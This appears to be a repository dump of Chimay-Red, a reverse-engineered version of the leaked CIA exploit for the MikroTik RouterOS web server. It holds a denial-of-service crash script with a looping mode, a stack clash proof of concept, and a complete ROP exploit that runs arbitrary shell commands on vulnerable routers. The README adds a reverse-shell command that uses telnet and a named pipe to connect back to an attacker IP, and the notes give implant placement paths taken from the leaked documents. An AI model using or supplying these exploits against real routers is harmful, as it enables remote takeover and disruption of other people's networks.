# Repository Information
Name: Chimay-Red

# Files

File: config
================================================
[core]
	repositoryformatversion = 0
	filemode = false
	bare = false
	logallrefupdates = true
	symlinks = false
	ignorecase = true
[remote "origin"]
	url = https://gitlab.com/str4t3gy/Chimay-Red.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
	remote = origin
	merge = refs/heads/master
================================================

File: description
================================================
Unnamed repository; edit this file 'description' to name the repository.
================================================

File: CrashPOC.py
================================================
#!/usr/bin/env python3
# Mikrotik Chimay Red Crash POC
# The www executable will be relaunched in 1 or 2 seconds
# Use 'dos' MODE argument to keep it crashing
# Usage CrashPOC.py IP MODE
# Examples:
#   ./CrashPOC.py 192.168.88.1 dos
#   ./CrashPOC.py 192.168.88.1 one
import socket, time, sys
header = """POST /jsproxy HTTP/1.1
Content-Length: -1
"""
body = "A"*4096
def crash(ip):
    try:
        s = socket.socket()
        s.connect((ip, 80))
        s.send(bytes(header + body, "ascii"))
        print("Sent")
        time.sleep(0.5)
        print(s.recv(1024))
    except KeyboardInterrupt:
        sys.exit(1)
    except:
        #print("Error")
        pass
def ddos(ip):
    while True:
        crash(ip)
if __name__ == "__main__":
    if len(sys.argv) == 3:
        if sys.argv[2] == "dos":
            ddos(sys.argv[1])
        else:
            crash(sys.argv[1])
    else:
        print("Usage: ./CrashPOC.py IP MODE")
================================================

File: getROSbin.py
================================================
#!/usr/bin/env python3
# RouterOS binary extractor by BigNerd95
import requests, sys, io, PySquashfsImage
MTDL_URL = "https://download2.mikrotik.com/routeros/"
SQFS_OFFSET = 0x1000
def download_ROS(version, arch):
    url = MTDL_URL + version + "/routeros-" + arch + "-" + version + ".npk"
    fw = requests.get(url, stream=True)
    if fw.status_code == requests.codes.ok and len(fw.content) > 0:
        return fw.content
    else:
        raise Exception("Error downloading firmware!")
def get_binary(fw, path):
    fwfd = io.BytesIO(fw)
    sqfs = PySquashfsImage.SquashFsImage(offset=SQFS_OFFSET)
    sqfs.setFile(fwfd)
    for f in sqfs.root.findAll():
        if f.getPath() == path:
            return f.getContent()
    raise Exception("Path not found!")
def main(version, arch, binary_path, save_name):
    print("Downloading firmware...")
    try:
        fw = download_ROS(version, arch)
    except Exception as e:
        print(e)
        return
    print("Extracting", binary_path)
    try:
        binary = get_binary(fw, binary_path)
    except Exception as e:
        print(e)
        return
    with open(save_name, "wb") as f:
        f.write(binary)
    print(binary_path, "saved as", save_name)
if __name__ == "__main__":
    if len(sys.argv) == 5:
        main(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
    else:
        print("Usage:", sys.argv[0], "VERSION ARCH BIN_PATH_TO_EXTRACT SAVE_NAME")
        print("Example:", sys.argv[0], "6.38.4 x86 /nova/bin/www www_6384_x86")
================================================

File: Misc_Notes.txt
================================================
[Mikrotik]
    https://wikileaks.org/ciav7p1/cms/page_28049428.html
    - For RouterOS 5.x
        For ops, place binary in "/nova/bin", and place script in "/etc/rc.d/"
    - For RouterOS 6.x
        For ops, place binary in "/flash/bin", and place script in "/flash/etc/rc.d/"
[Perseus]
https://wikileaks.org/ciav7p1/cms/page_16384510.html
(install log https://wikileaks.org/ciav7p1/cms/files/2015-04-16_063833-Perseus-Install_Log.log)
    ChimayRed 4.5.1
    [1/7/2015 2/7/2015 6/7/2015 7/7/2015 10/7/2015 13/7/2015 15/7/2015]
        DUT3 - RB450G - Long Term Test
            https://wikileaks.org/ciav7p1/cms/page_20250630.html
    ChimayRed 4.6.1
    [27/7/2015 28/7/2015 29/7/2015]
        DUT4 - RB1100AH - v1.1.0 Notes
            https://wikileaks.org/ciav7p1/cms/page_20251203.html
            (Downgraded to ROS 6.30.1.  ChimayRed does not support 6.30.2)
    ChimayRed 4.12
    [10/2/2016 11/2/2016 12/2/2016 18/2/2016 19/2/2016]
        DUT6 - RB800 - v1.3.0 Notes
            https://wikileaks.org/ciav7p1/cms/page_50495490.html
            (ROS: 6.30)
[ChimayRed 3.7]
    https://wikileaks.org/ciav7p1/cms/files/image2015-4-27%2010:46:48.png
    Guide:
        https://wikileaks.org/ciav7p1/cms/page_16385037.html
================================================

File: README.md
================================================
# Chimay-Red
Reverse engineering of Mikrotik exploit from Vault 7 CIA Leaks  
See the PDF for more info 
# Vulnerable versions  
Until RouterOS 6.38.4  
What's new in 6.38.5 (2017-Mar-09 11:32):  
!) www - fixed http server vulnerability;
# Proof of concepts
## CrashPOC  
Simple crash sending -1 as content-length in post header 
## StackClashPOC  
Stack clash exploit using two threads, missing ROP chain
## StackClashROPSystem  
Stack clash exploit using two threads  with ROP chain to run bash commands  
For a reverse shell:  
```
$ nc -l -p 1234
$ ./StackClashROPsystem.py 192.168.8.1 80 www_binary "/bin/mknod /ram/f p; /bin/telnet 192.168.8.5 1234 < /ram/f | /bin/bash > /ram/f 2>&1"
```
Where:  
- RouterOS IP: 192.168.8.1  
- PC IP: 192.168.8.5  
As the ROP is dynamically created, you have to extract the `www` binary from the RouterOS firmware.   
(It's placed in `/nova/bin/`)  
Check that the running version is the same.  
To simplify extraction you can use:
```
$ ./getROSbin.py 6.38.4 x86 /nova/bin/www www_binary
```
# FAQ
#### Where does one get the chimay-red.py file, that this tool kit relies on?  
This is a reverse engineering of leaked CIA documentation.  
There is no chimay-red.py publicly available.  
#### I can't understand how the stack clash work.
I'll update the PDF as soon as I have enough time, anyway:  
We know that:  
- each thread has 128KB of stack  
- each stack of each thread is stacked on the top of the previous thread.  
Thanks to Content-Length and alloca macro we can control the Stack Pointer and where the post data will be written.  
If we send a Content-Length bigger than 128KB to socket of thread A, the Stack Pointer will point inside the stack of another thread (B) and so the POST data (of thread A) will be written inside the stack of thread B (in any position we want, we only need to adjust the Content-Length value).  
So now we can write a ROP chain in the stack of thread B starting from a position where a return address is saved.  
When we close the socket of thread B, the ROP chain will start because the function that is waiting for data will return (but on our modified address).
The ROP chain that executes bash commands is using "dlsym" (present in the PLT) to find the address of "system".  
Once we have the address of system we construct the bash string looking for chunks of strings inside the binary and concatenating them in an unused area of memory.  
Then we return to the address of system passing as argument the address of the created bash string.  
================================================

File: StackClashPOC.py
================================================
#!/usr/bin/env python3
# Mikrotik Chimay Red Stack Clash POC by BigNerd95
# tested on RouterOS 6.38.4 (x86)
# AST_STACKSIZE = 0x20000 (stack frame size per thread)
# ASLR enabled on libs only
# DEP enabled
import socket, time, sys, struct
def makeHeader(num):
    return b"POST /jsproxy HTTP/1.1\r\nContent-Length: " + bytes(str(num), 'ascii') + b"\r\n\r\n"
def makeSocket(ip, port):
    s = socket.socket()
    try:
        s.connect((ip, port))
    except:
        print("Error connecting to socket")
        sys.exit(-1)
    print("Connected")
    time.sleep(0.5)
    return s
def socketSend(s, data):
    try:
        s.send(data)
    except:
        print("Error sending data")
        sys.exit(-1)
    print("Sent")
    time.sleep(0.5)
def stackClash(ip):
    # 1) Start 2 threads
    # open 2 socket so 2 threads are created
    s1 = makeSocket(ip, 80) # socket 1, thread A
    s2 = makeSocket(ip, 80) # socket 2, thread B
    # 2) Stack Clash
    # 2.1) send post header with Content-Length 0x20900 to socket 1 (thread A)
    socketSend(s1, makeHeader(0x20900)) # thanks to alloca, the Stack Pointer of thread A will point inside the stack frame of thread B (the post_data buffer will start from here)
    # 2.2) send 0x700-0x14 bytes as post data to socket 1 (thread A)
    socketSend(s1, b'A'*(0x700-20)) # increase the post_data buffer pointer of thread A to a position where a return address of thread B will be saved
    # 2.3) send post header with Content-Length 0x200 to socket 2 (thread B)
    socketSend(s2, makeHeader(0x200)) # thanks to alloca, the Stack Pointer of thread B will point where post_data buffer pointer of thread A is positioned
    # 3) Send ROP chain
    # send 4 byte to socket 1 (thread A) to overwrite a return address of a function in thread B
    socketSend(s1, struct.pack('<L', 0x13371337)) # [ROP chain addresses start here]
    # add here your ROP chain addresses
    # socketSend(s1, struct.pack('<L', 0x13371337))
    # ...
    # 4) Start ROP chain
    s2.close() # close socket 2 to return from the function of thread B and start ROP chain
if __name__ == "__main__":
    if len(sys.argv) == 2:
        stackClash(sys.argv[1])
    else:
        print("Usage: ./StackClashPOC.py IP")
================================================

File: StackClashROPsystem.py
================================================
#!/usr/bin/env python2
# Mikrotik Chimay Red Stack Clash Exploit by wsxarcher (based on BigNerd95 POC)
# tested on RouterOS 6.38.4 (x86)
# ASLR enabled on libs only
# DEP enabled
import socket, time, sys, struct
from pwn import *
import ropgadget
AST_STACKSIZE = 0x20000 # stack size per thread (128 KB)
SKIP_SPACE    =  0x1000 # 4 KB of "safe" space for the stack of thread 2
ROP_SPACE     =  0x8000 # we can send 32 KB of ROP chain!
ALIGN_SIZE    = 0x10 # alloca align memory with "content-length + 0x10 & 0xF" so we need to take it into account
ADDRESS_SIZE  =  0x4 # we need to overwrite a return address to start the ROP chain
context(arch="i386", os="linux", log_level="WARNING")
gadgets = dict()
plt = dict()
strings = dict()
system_chunks = []
cmd_chunks = []
def makeHeader(num):
    return bytes("POST /jsproxy HTTP/1.1\r\nContent-Length: ") + bytes(str(num)) + bytes("\r\n\r\n")
def makeSocket(ip, port):
    s = socket.socket()
    try:
        s.connect((ip, port))
    except:
        print("Error connecting to socket")
        sys.exit(-1)
    print("Connected")
    time.sleep(0.5)
    return s
def socketSend(s, data):
    try:
        s.send(data)
    except:
        print("Error sending data")
        sys.exit(-1)
    print("Sent")
    time.sleep(0.5)
def ropCall(function_address, *arguments):
    payload = struct.pack('<L', function_address)
    num_arg = len(arguments)
    if num_arg > 0:
        if num_arg == 1:
            ret_gadget = gadgets['p']
        elif num_arg == 2:
            ret_gadget = gadgets['pp']
        elif num_arg == 3:
            ret_gadget = gadgets['ppp']
        elif num_arg == 4:
            ret_gadget = gadgets['pppp']
        else:
            raise
        payload += struct.pack('<L', ret_gadget)
        for arg in arguments:
            payload += struct.pack('<L', arg)
    return payload
# pwntools filters out JOP gadgets
# https://github.com/Gallopsled/pwntools/blob/5d537a6189be5131e63144e20556302606c5895e/pwnlib/rop/rop.py#L1074
def ropSearchJmp(elf, instruction):
    oldargv = sys.argv
    sys.argv = ['ropgadget', '--binary', elf.path, '--only', 'jmp']
    args = ropgadget.args.Args().getArgs()
    core = ropgadget.core.Core(args)
    core.do_binary(elf.path)
    core.do_load(0)
    sys.argv = oldargv
    for gadget in core._Core__gadgets:
        address = gadget['vaddr'] - elf.load_addr + elf.address
        if gadget['gadget'] == instruction:
            return address
    raise
def loadOffsets(binary, shellCmd):
    elf = ELF(binary)
    rop = ROP(elf)
    # www PLT symbols
    plt["strncpy"] = elf.plt['strncpy']
    plt["dlsym"]   = elf.plt['dlsym']
    # Gadgets to clean the stack from arguments
    gadgets['pppp'] = rop.search(regs=["ebx", "esi", "edi", "ebp"]).address
    gadgets['ppp'] = rop.search(regs=["ebx", "ebp"], move=(4*4)).address
    gadgets['pp'] = rop.search(regs=["ebx", "ebp"]).address
    gadgets['p'] = rop.search(regs=["ebp"]).address
    # Gadget to jump on the result of dlsym (address of system)
    gadgets['jeax'] = ropSearchJmp(elf, "jmp eax")
    system_chunks.extend(searchStringChunks(elf, "system\x00"))
    cmd_chunks.extend(searchStringChunks(elf, shellCmd + "\x00"))
    # get the address of the first writable segment to store strings
    writable_address = elf.writable_segments[0].header.p_paddr
    strings['system'] = writable_address
    strings['cmd']    = writable_address + 0xf
def generateStrncpyChain(dst, chunks):
    chain = ""
    offset = 0
    for (address, length) in chunks:
        chain += ropCall(plt["strncpy"], dst + offset, address, length)
        offset += length
    return chain
def searchStringChunks(elf, string):
    chunks = []
    total = len(string)
    if string == "":
        raise
    looking = string
    while string != "":
        results = [_ for _ in elf.search(looking)]
        if len(results) > 0:
            chunks.append((results[0], len(looking)))
            string = string[len(looking):]
            looking = string
        else:   # search failed
            looking = looking[:-1] # search again removing last char
    check_length = 0
    for (address, length) in chunks:
        check_length = check_length + length
    if check_length == total:
        return chunks
    else:
        raise
def buildROP(binary, shellCmd):
    loadOffsets(binary, shellCmd)
    # ROP chain
    exploit  = generateStrncpyChain(strings['system'], system_chunks) # w_segment = "system"
    exploit += generateStrncpyChain(strings['cmd'], cmd_chunks)       # w_segment = "bash cmd"
    exploit += ropCall(plt["dlsym"], 0, strings['system']) # dlsym(0, "system"), eax = libc.system
    exploit += ropCall(gadgets['jeax'], strings['cmd'])    # system("cmd")
    # The server is automatically restarted after 3 secs, so we make it crash with a random address
    exploit += struct.pack('<L', 0x13371337)
    return exploit
def stackClash(ip, port, ropChain):
    print("Opening 2 sockets")
    # 1) Start 2 threads
    # open 2 socket so 2 threads are created
    s1 = makeSocket(ip, port) # socket 1, thread A
    s2 = makeSocket(ip, port) # socket 2, thread B
    print("Stack clash...")
    # 2) Stack Clash
    # 2.1) send post header with Content-Length bigger than AST_STACKSIZE to socket 1 (thread A)
    socketSend(s1, makeHeader(AST_STACKSIZE + SKIP_SPACE + ROP_SPACE)) # thanks to alloca, the Stack Pointer of thread A will point inside the stack frame of thread B (the post_data buffer will start from here)
    # 2.2) send some bytes as post data to socket 1 (thread A)
    socketSend(s1, b'A'*(SKIP_SPACE - ALIGN_SIZE - ADDRESS_SIZE)) # increase the post_data buffer pointer of thread A to a position where a return address of thread B will be saved
    # 2.3) send post header with Content-Length to reserve ROP space to socket 2 (thread B)
    socketSend(s2, makeHeader(ROP_SPACE)) # thanks to alloca, the Stack Pointer of thread B will point where post_data buffer pointer of thread A is positioned
    print("Sending payload")
    # 3) Send ROP chain
    socketSend(s1, ropChain) # thread A writes the ROP chain in the stack of thread B 
    print("Starting exploit")
    # 4) Start ROP chain
    s2.close() # close socket 2 to return from the function of thread B and start ROP chain
    print("Done!")
if __name__ == "__main__":
    if len(sys.argv) == 5:
        ip       = sys.argv[1]
        port     = int(sys.argv[2])
        binary   = sys.argv[3]
        shellCmd = sys.argv[4]
        print("Building ROP chain...")
        ropChain = buildROP(binary, shellCmd)
        print("The ROP chain is " + str(len(ropChain)) + " bytes long (" + str(ROP_SPACE) + " bytes available)")
        stackClash(ip, port, ropChain)
    else:
        print("Usage: ./StackClashROPsystem.py IP PORT binary shellcommand")